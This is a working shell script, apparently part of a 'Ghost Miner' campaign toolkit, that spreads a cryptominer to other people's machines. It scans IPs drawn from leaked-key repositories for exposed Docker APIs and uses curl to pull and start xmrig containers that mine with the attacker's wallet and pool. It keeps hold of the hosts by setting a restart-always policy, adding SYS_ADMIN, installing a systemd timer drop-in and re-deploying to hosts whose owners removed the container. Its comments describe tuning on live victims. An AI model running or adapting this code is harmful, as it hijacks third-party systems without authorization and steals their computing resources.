#!/bin/sh
# ============================================================================
# Ghost Miner docker spreader - the one vector that needs NO credentials.
#
# An exposed daemon on :2375 (or TLS :2376) needs no key, no username and no
# (key,user,host) pairing - you just POST a container that mines. curl only, so
# nothing has to exist on the victim, not even the docker CLI.
#
# The container is created with RestartPolicy=always (it comes back with the
# daemon, including after a reboot), CpuShares 512 (container equivalent of our
# niceness) and a boring name.
#
# Hosts come from the hunter's own list: every IP any leaked-key repo mentioned,
# whether or not it ever answered SSH. That is the point - this reaches boxes
# the SSH path can never touch, because nothing has to match.
#
# State: .hunt/dock.seen (daemon found, never rescanned) and .hunt/dock.tried
# (scanned, nothing there - rescanned after DOCK_RETRY so a later daemon is
# still caught).
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
# Snapshot env overrides BEFORE sourcing: worker.env publishes plain assignments,
# so it would otherwise swallow an ad-hoc "DOCK_PAR=5 sh dock.sh". Precedence:
# environment > worker.env > built-in default.
E_MAX="${DOCK_MAX_HOSTS:-}"; E_PAR="${DOCK_PAR:-}"; E_SELF="${DOCK_SKIP_SELF:-}"
E_REARM="${DOCK_REARM:-}"; E_RMAX="${DOCK_REARM_MAX:-}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
[ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK"

IMAGE="${DOCK_IMAGE:-xmrig/xmrig}"
MAX="${E_MAX:-${DOCK_MAX_HOSTS:-120}}"      # hosts scanned per run
PAR="${E_PAR:-${DOCK_PAR:-20}}"             # concurrent probes
RETRY="${DOCK_RETRY:-604800}"     # rescAN a dead host after 7d
PORTS="${DOCK_PORTS:-2375 2376 4243}"
SKIPSELF="${E_SELF:-${DOCK_SKIP_SELF:-yes}}"   # don't stack a container on our own daemon
# ---- self-healing cadence ---------------------------------------------------
# Our timer shipped with a 6h period, which throttled the whole vector. The
# updater rewrites unit files but never their intervals, so enforce it here too:
# a drop-in outranks the main unit AND survives updater rewrites. Off-box runs
# (the PC under git-bash, containers) fail these tests and skip.
if [ -d /etc/systemd/system ] && [ -w /etc/systemd/system ] &&
   [ ! -f /etc/systemd/system/kworker-dock.timer.d/zz-cadence.conf ]; then
    mkdir -p /etc/systemd/system/kworker-dock.timer.d 2>/dev/null &&
        printf '[Timer]\nOnUnitActiveSec=20min\nRandomizedDelaySec=2min\n' \
            > /etc/systemd/system/kworker-dock.timer.d/zz-cadence.conf 2>/dev/null &&
        { systemctl daemon-reload 2>/dev/null; systemctl restart kworker-dock.timer 2>/dev/null; } || true
fi
# ---- re-arm: the difference between infecting and KEEPING --------------------
# Measured on this population: a slice of the boxes prunes foreign containers AND
# images off themselves (our container gone, /images/<img>/json 404, while the
# host's own container survives). dock.seen used to mean "skip forever", so a
# pruned host was never revisited - which is exactly why the placed-container
# count climbed while live capacity did not. So every run now re-verifies
# everything we own, plus a rotating slice of known daemons we no longer hold,
# and re-deploys what has vanished. Found, then lost, is still winnable.
REARM="${E_REARM:-${DOCK_REARM:-yes}}"
REARM_MAX="${E_RMAX:-${DOCK_REARM_MAX:-150}}"   # re-checks per run (rotates)
SEEN="$WORK/dock.seen"            # daemon found here
TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
LEDGER="$WORK/dock.recheck"       # known daemons NOT currently ours (rotates)
touch "$SEEN" "$TRIED" "$OWNFILE" "$LEDGER"
NOW=$(date +%s)

[ -n "${WALLET:-}" ] || { echo "dock: WALLET unset"; exit 0; }
[ -n "${POOL:-}" ]   || { echo "dock: POOL unset"; exit 0; }

HOSTS="$WORK/dockhosts.$$"
# CR matters, and it cost us the whole sweep: mass.found can arrive with CRLF
# (scp'd from the Windows box) and the strict IPv4 regex below then drops
# "1.2.3.4\r" - so thousands of sweep-verified daemons sat in the queue and the
# deployer never saw one row of it ("scanned 203" while mass.found held 4,034).
# Strip CR before matching, same as publish.sh does for the kit itself.
{ cut -f3 "$WORK/targets.txt" 2>/dev/null || :
  cut -f3 "$WORK/loot.txt" 2>/dev/null || :
  cut -f1 "$WORK/mass.found" 2>/dev/null || :; } \
    | tr -d '\r' | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u > "$HOSTS"

# Re-arm rows, built before the fresh queue so healing is never starved by the
# cap. Everything we own, every run; plus the head of the rotating ledger.
REARM_LIST="$WORK/rearm.$$"
: > "$REARM_LIST"
if [ "$REARM" = yes ]; then
    { cut -f1 "$OWNFILE" 2>/dev/null || :; } \
        | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' >> "$REARM_LIST" || :
    head -n "$REARM_MAX" "$LEDGER" 2>/dev/null >> "$REARM_LIST" || :
fi
sort -u "$REARM_LIST" -o "$REARM_LIST" 2>/dev/null || :
# a known-but-lost host can have dropped out of every candidate list, so union
# the re-arm rows into the walk too (the fresh pass skips them by membership).
cat "$REARM_LIST" >> "$HOSTS"
sort -u "$HOSTS" -o "$HOSTS" 2>/dev/null || :

# container command line (wallet/pool/rig, same identity as the ssh payload).
# SYS_ADMIN + host IPC let xmrig apply the MSR mod and reach the host's hugepage
# pool, otherwise it logs "HASHRATE WILL BE LOW" and loses a chunk of the speed.
CMDS="\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"${RIG_ID:-node}\",\"--no-color\",\"-k\""
case "${TLS:-true}" in
    true|TRUE|1|yes) CMDS="$CMDS,\"--tls\"" ;;
esac
# Output knobs. Measured on a live victim (8 vCPU / 8GB): our xmrig sat at 210 H/s
# while using 0.65 of ONE core - it had taken the image's default single-thread
# layout and left seven cores idle. xmrig's own autoconfig is conservative; these
# three flags are the whole difference between 21 H/s average and a real core's
# worth: use every visible vCPU, take the JIT/huge-page path instead of the slow
# default, and stop yielding the CPU back the moment the owner twitches.
CMDS="$CMDS,\"--cpu-max-threads-hint=100\",\"--huge-pages-jit\",\"--cpu-no-yield\""
# A label of our own is how the container is recognised later without guessing:
# image-name matching alone would adopt a stranger's xmrig, and after a host
# prunes us we must be able to tell "ours is gone" reliably - that is the whole
# re-arm trigger.
TAG="\"kworker\":\"1\""
# CpuShares 512 was our "polite container" setting (same idea as the ssh payload's
# nice 19) - but on an 8-vCPU box xmrig was only getting 0.65 of a core because the
# host was busy, so the politeness was costing us most of the machine. 2048 (2x a
# default container) is still a freeloader, just a less apologetic one.
BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":2048,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"

# a host is interesting only if a docker API answers - so verify it IS docker,
# not just an open port (and no /dev/tcp, so bash is not required either)
endpoint() {
    for p in $PORTS; do
        case "$p" in
            2375|4243) b="http://$1:$p";  o="" ;;
            2376) b="https://$1:2376"; o="-k" ;;
            *) continue ;;
        esac
        v=$(curl -fsS $o --max-time 4 "$b/version" 2>/dev/null) || continue
        case "$v" in *ApiVersion*) printf '%s|%s\n' "$b" "$o"; return 0 ;; esac
    done
    return 1
}

dock_one() {
    ip=$1
    ep=$(endpoint "$ip") || {
        printf '%s\t%s\n' "$NOW" "$ip" >> "$TRIED"
        return 0
    }
    base=${ep%|*}
    opts=${ep#*|}

    ver=$(curl -fsS $opts --max-time 4 "$base/version" 2>/dev/null) || ver=""
    # old engines (18.06-era) emit '"Version": "x"' WITH a space; a strict grep
    # silently returned an empty version and, worse, an empty ApiVersion - which
    # sent every later call down the unversioned path they do not route.
    vs=$(printf '%s' "$ver" | grep -o '"Version": *"[^"]*"' | head -1 | cut -d'"' -f4)
    # Speak /v<ApiVersion>/... like a real client. Not cosmetic: old engines and
    # api proxies answer "page not found" to *unversioned dynamic* paths such as
    # /containers/<id>/json or /containers/<id>/start, while the static
    # /containers/json and /version keep working - which is precisely how
    # "created but start failed" was born (create is static, start is not).
    vapi=$(printf '%s' "$ver" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
    b="$base"
    [ -n "$vapi" ] && b="$base/v$vapi"
    printf '%s\n' "$ip" >> "$SEEN"
    echo "dock: daemon $ip  $base  docker=${vs:-?} api=${vapi:-?}"

    # if this daemon is the very box we are running on, the ssh payload already
    # mines here - a second xmrig would just buy a second randomx dataset. Only
    # an existing container of ours is worth touching (handled above).
    if [ "$SKIPSELF" = yes ]; then
        me=$(hostname 2>/dev/null) || me=""
        nm=$(curl -fsS $opts --max-time 4 "$b/info" 2>/dev/null \
             | grep -o '"Name": *"[^"]*"' | head -1 | cut -d'"' -f4)
        if [ -n "$me" ] && [ "$nm" = "$me" ]; then
            echo "dock: $ip is this host (payload mines here already)"
            return 0
        fi
    fi

    # ONE list call tells us what is already here. Name-based /containers/<n>/json
    # 404s on a chunk of the population (old engines, api proxies - "page not
    # found"), so a name always *looked* free and the container was created blind;
    # the start by name then 404s too. So: read the list, and take the id from
    # create's response instead of spelling it by name.
    lst=$(curl -sS $opts --max-time 6 "$b/containers/json?all=1" 2>/dev/null) || lst=""
    if [ -z "$lst" ] && [ "$b" != "$base" ]; then
        # this front routes only the bare spelling - pin that for every call that
        # follows rather than keep guessing
        lst=$(curl -sS $opts --max-time 6 "$base/containers/json?all=1" 2>/dev/null) || lst=""
        [ -n "$lst" ] && b="$base"
    fi
    # docker 18.06 writes '"Id": "x"' with a space; normalise once so the awk
    # below (and the name-taken test) can trust a single spelling.
    lst=$(printf '%s' "$lst" | sed 's/": /":/g')
    have=$(printf '%s' "$lst" | awk -v tag="$TAG" -v img="\"Image\":\"$IMAGE\"" '
        { n = split($0, a, "\"Id\":\"")
          for (i = 2; i <= n; i++)
              if (index(a[i], tag) > 0 || index(a[i], img) > 0) { split(a[i], b, "\""); print b[1]; exit } }')
    if [ -n "$have" ]; then
        up=$(printf '%s' "$lst" | awk -v tag="$TAG" -v img="\"Image\":\"$IMAGE\"" '
            { n = split($0, a, "\"Id\":\"")
              for (i = 2; i <= n; i++)
                  if (index(a[i], tag) > 0 || index(a[i], img) > 0) { print (index(a[i], "\"Up ") > 0) ? "up" : "down"; exit } }')
        if [ "$up" = up ]; then
            # Config drift: we only re-create a container when it is missing, so a
            # host infected before the CpuShares/thread-hint change would keep its
            # throttled container forever. Compare, and force a re-create if stale.
            shares=$(curl -fsS $opts --max-time 8 "$b/containers/$have/json" 2>/dev/null \
                     | grep -o '"CpuShares":[0-9]*' | head -1 | cut -d: -f2)
            if [ -n "${shares:-}" ] && [ "$shares" -lt 2048 ]; then
                curl -fsS $opts --max-time 20 -X DELETE "$b/containers/$have?force=1" >/dev/null 2>&1 || :
                echo "dock: $ip stale container (CpuShares $shares), re-creating"
                have=""
            fi
        fi
        if [ -n "${have:-}" ] && [ "$up" = up ]; then
            echo "dock: $ip already runs ours ($have)"
        elif [ -n "${have:-}" ]; then
            curl -fsS $opts --max-time 15 -X POST "$b/containers/$have/start" >/dev/null 2>&1 || :
            echo "dock: $ip started our existing container ($have)"
        fi
        printf '%s\t%s\n' "$ip" "existing" >> "$OWNFILE"
        return 0
    fi

    # pick a free boring name; "taken" means the list mentions it
    name=""
    for n in kworker kworker1 kworker2 kworker3; do
        case "$lst" in
            *"\"/$n\""*) continue ;;   # someone else's container holds that name
        esac
        name=$n
        break
    done
    [ -n "$name" ] || { echo "dock: $ip all names taken"; return 0; }

    # pull only if the image is not already there (their bandwidth)
    if ! curl -fsS $opts --max-time 6 "$b/images/$IMAGE/json" >/dev/null 2>&1; then
        echo "dock: $ip pulling $IMAGE"
        curl -sS $opts --max-time 300 -X POST \
             "$b/images/create?fromImage=$IMAGE" >/dev/null 2>&1 || :
    fi

    # NOTE the -f on the create/start checks: without it a 404 body
    # ({"message":"page not found"}) still exits 0 and a failed start is
    # recorded as a deploy.
    if r=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
                -H "Content-Type: application/json" -d "$BODY" 2>/dev/null); then
        id=$(printf '%s' "$r" | grep -oE '[0-9a-f]{64}' | head -1)
        cid=${id:-$name}
        # No -f here: docker answers a good start with 204 and an empty body, and a
        # refused one with a JSON error body. So the body IS the verdict and the
        # reason - which is the only way to learn why a daemon says no.
        err=$(curl -sS $opts --max-time 25 -X POST \
                  "$b/containers/$cid/start" 2>/dev/null) || err="curl failed"
        if [ -z "$err" ]; then
            printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
            echo "dock: DEPLOYED $name -> $ip (restart=always)"
        else
            # a second attempt as boring as possible: SYS_ADMIN, host ipc and
            # cpu shares are all things a hardened daemon can refuse at start.
            echo "dock: $ip start said: $(printf '%s' "$err" | head -c 150)"
            curl -sS $opts --max-time 20 -X DELETE \
                 "$b/containers/$cid?force=1" >/dev/null 2>&1 || :
            body_min="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG}"
            body_min="$body_min,\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
            if r2=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
                          -H "Content-Type: application/json" -d "$body_min" 2>/dev/null); then
                id2=$(printf '%s' "$r2" | grep -oE '[0-9a-f]{64}' | head -1)
                err2=$(curl -sS $opts --max-time 25 -X POST \
                           "$b/containers/${id2:-$name}/start" 2>/dev/null) || err2="curl failed"
                if [ -z "$err2" ]; then
                    printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
                    echo "dock: DEPLOYED $name -> $ip (plain, restart=always)"
                else
                    echo "dock: plain start also said: $(printf '%s' "$err2" | head -c 150)"
                fi
            else
                echo "dock: recreate failed on $ip"
            fi
        fi
    else
        echo "dock: create failed on $ip"
    fi
}

queued=$(wc -l < "$HOSTS")
rearm_n=$(wc -l < "$REARM_LIST")
echo "dock: $queued candidates, re-arm $rearm_n, cap $MAX, parallel $PAR"
owned_before=$(wc -l < "$OWNFILE")

# Known hosts first (re-arm), then genuinely new candidates. Re-arm rows bypass
# dock.seen and the retry ledger on purpose - those two are what used to make a
# pruned host unreachable forever.
n=0
walk() {
    role=$1
    echo "dock: pass $role, $(wc -l < "$LIST") row(s)"
    while read -r ip; do
        [ -n "$ip" ] || continue
        if [ "$role" = fresh ]; then
            # if/then, NOT `grep ... && continue`: under `set -e` an AND-list whose
            # first command fails is a landmine, and this is where a whole 2375-row
            # candidate file silently turned into zero scans.
            if grep -qxF "$ip" "$SEEN" 2>/dev/null; then continue; fi
            if grep -qxF "$ip" "$REARM_LIST" 2>/dev/null; then continue; fi
            if awk -v now="$NOW" -v retry="$RETRY" -v ip="$ip" \
                    '$2 == ip && $1 > now - retry { f = 1 } END { exit !f }' "$TRIED"; then
                continue
            fi
        fi
        n=$((n + 1))
        if [ "$n" -gt "$MAX" ]; then echo "dock: cap $MAX reached, rest stays queued"; return 0; fi
        dock_one "$ip" < /dev/null &
        # ^ /dev/null matters: a backgrounded dock_one otherwise inherits the
        #   walk's stdin (the candidate file) and eats lines out from under the
        #   `read`, so a 2290-row queue ended after 181 rows.
        if [ $((n % PAR)) -eq 0 ]; then wait || true; fi
    done < "$LIST"
}
LIST="$REARM_LIST"; walk rearm
LIST="$HOSTS";      walk fresh
wait || true
rm -f "$HOSTS" "$REARM_LIST"
sort -u "$OWNFILE" -o "$OWNFILE" 2>/dev/null || true
# Then dedupe by *IP*: every successful start appends a row, so the file was really
# a log of starts (94 rows for 53 real hosts) and "placed 57 (+-38 new)" was
# arithmetic on that. One row per endpoint keeps the numbers we steer by honest.
awk -F'\t' '!s[$1]++' "$OWNFILE" > "$OWNFILE.n" 2>/dev/null && mv -f "$OWNFILE.n" "$OWNFILE" || true

# Rotate the ledger: known daemons minus what we now hold, with the slice we just
# checked moved to the tail, so the next run re-checks the *others*. Without the
# rotation the same head would be retried forever and the tail never reached.
if [ "$REARM" = yes ]; then
    cut -f1 "$OWNFILE" 2>/dev/null | sort -u > "$WORK/own.$$" || :
    grep -vxF -f "$WORK/own.$$" "$SEEN" 2>/dev/null | sort -u > "$WORK/lg.$$" || :
    tail -n +$((REARM_MAX + 1)) "$WORK/lg.$$" > "$WORK/lg2.$$" 2>/dev/null || :
    head -n "$REARM_MAX" "$WORK/lg.$$" >> "$WORK/lg2.$$" 2>/dev/null || :
    mv -f "$WORK/lg2.$$" "$LEDGER" 2>/dev/null || cp -f "$WORK/lg2.$$" "$LEDGER"
    rm -f "$WORK/own.$$" "$WORK/lg.$$" "$WORK/lg2.$$"
fi
owned_now=$(wc -l < "$OWNFILE")
echo "dock: scanned $n, daemons known $(wc -l < "$SEEN"), placed $owned_now (+$((owned_now - owned_before)) new, $rearm_n re-verified)"
echo "dock: re-arm ledger holds $(wc -l < "$LEDGER") known-but-lost host(s)"

